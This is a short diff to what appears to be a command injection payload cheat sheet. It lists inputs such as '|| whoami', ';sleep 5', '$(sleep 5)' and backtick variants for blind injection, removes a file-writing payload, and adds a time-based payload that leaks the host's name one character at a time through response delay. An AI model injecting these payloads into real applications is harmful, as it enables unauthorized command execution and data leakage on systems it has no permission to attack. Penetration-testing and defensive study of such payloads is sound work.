@@ -11,8 +11,6 @@
 
 || whoami
 
-<(echo 1 > /tmp/test)
-
 # For Testing blind Command Injection 
 ;sleep 5
 
@@ -23,6 +21,8 @@
 `` `sleep 5` ``
 
 $(sleep 5)
+
+sleep $(hostname | cut -c 1 | tr a 5) // For getting the output based on the execution time
 
 # Command Injection without Spaces
 
